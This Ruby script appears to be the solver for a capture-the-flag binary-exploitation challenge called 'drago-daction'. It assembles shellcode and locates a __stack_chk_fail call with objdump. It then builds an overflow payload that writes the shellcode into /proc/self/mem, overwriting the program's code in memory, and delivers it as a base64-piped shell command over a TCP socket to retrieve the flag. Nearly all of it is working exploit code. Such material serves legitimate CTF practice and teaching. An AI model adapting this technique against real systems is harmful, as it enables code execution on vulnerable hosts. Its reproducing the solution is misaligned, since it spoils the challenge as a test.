# encoding: ASCII-8bit

require 'base64'
require 'tempfile'
require 'socket'
require_relative './libronsolve'

# This is how long the "replace" string can be to get to the overflow
PADDING = 128

# Target executable
EXE = ::File.join(__dir__, '..', 'challenge', 'src', 'drago-daction')

# Compile the shellcode
Tempfile.create('shellcode.bin') do |shellcode_file|
  shellcode_file.close

  unless system("nasm -o #{ shellcode_file.to_path } #{ File.join(__dir__, 'shellcode.asm') }")
    raise 'nasm failed! Please install nasm'
  end

  SHELLCODE = File.read(shellcode_file.to_path).force_encoding('ASCII-8bit').ljust(PADDING, 'A')
end

# The target address changes based on where the NUL byte is (because of a strlen
# usage)
ADJUST = SHELLCODE.index("\0") + 3

# Validate the shellcode
if SHELLCODE.length > PADDING
  puts 'shellcode is too long!'
  exit 1
end
if SHELLCODE.include?("\n")
  puts "shellcode has a newline! That's bad!"
  exit 1
end

# Find a good place to target - we're choosing this line:
# 401751:       e8 2a f9 ff ff          call   401080 <__stack_chk_fail@plt>
unless `objdump -D #{ EXE } | grep 'call.*__stack_chk_fail@plt' | tail -n1` =~ /^ *([0-9a-fA-F]*)/
  puts "Couldn't find __stack_chk_fail call!"
  exit 1
end
TARGET_ADDRESS = Regexp.last_match(1).to_i(16)
TARGET_ADDRESS_STR = [TARGET_ADDRESS - ADJUST].pack('V')

puts 'Target: 0x%08x (0x%08x)' % [TARGET_ADDRESS, TARGET_ADDRESS - ADJUST]

# Create the dragonfile
file = File.new('/tmp/dragonfile.txt', 'w')

# This requires two lines: one to overwrite the pointers, and one to write to
# memory
file.puts("dragon#{ 'B' * 100 }")
file.puts("dragon#{ 'B' * 100 }")
file.close

# We overwrite the target offset in /proc/self/mem, literally changing code in
# memory
payload = [
  "dragon\n",
  "#{ SHELLCODE }#{ TARGET_ADDRESS_STR }/proc/self/mem\0\n",
].join()

command = "echo \"#{ Base64.strict_encode64(payload) }\" | base64 -d | './drago-daction' #{ file.to_path }"
command = "echo #{ Base64.strict_encode64(File.read('/tmp/dragonfile.txt')) } | base64 -d > /tmp/dragonfile.txt; chmod 0777 /tmp/dragonfile.txt; #{ command }"
puts command

host, port = get_host_port
s = TCPSocket.new(host, port)
puts "Connected: #{ s }"

sleep(0.5)

s.readpartial(65_000)

s.puts(command)

sleep(1)
out = s.readpartial(65_000)

check_flag(out, terminate: true, partial: true)
